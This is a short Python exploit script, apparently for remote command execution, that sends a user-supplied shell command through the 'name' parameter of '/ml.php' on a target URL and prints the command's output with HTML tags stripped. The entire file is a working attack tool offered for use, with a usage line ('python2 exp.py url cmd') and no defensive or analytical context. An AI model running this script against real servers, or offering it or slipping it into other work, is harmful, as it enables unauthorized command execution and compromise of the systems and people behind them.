#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import sys
import re

def exp(attack_url,cmd):
        attack_payload = '/ml.php?name=%s' %cmd
        attack_req = requests.get(url=attack_url+attack_payload)
        rar = attack_req.content.decode('gb2312')
        
        dr = re.compile(r'<[^>]+>',re.S)  #去除HTML标签
        dd = dr.sub('',rar)

        print (dd)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("python2 exp.py url cmd")
        sys.exit()
    else:
        attack_url = sys.argv[1]
        cmd = sys.argv[2]
        exp(attack_url,cmd)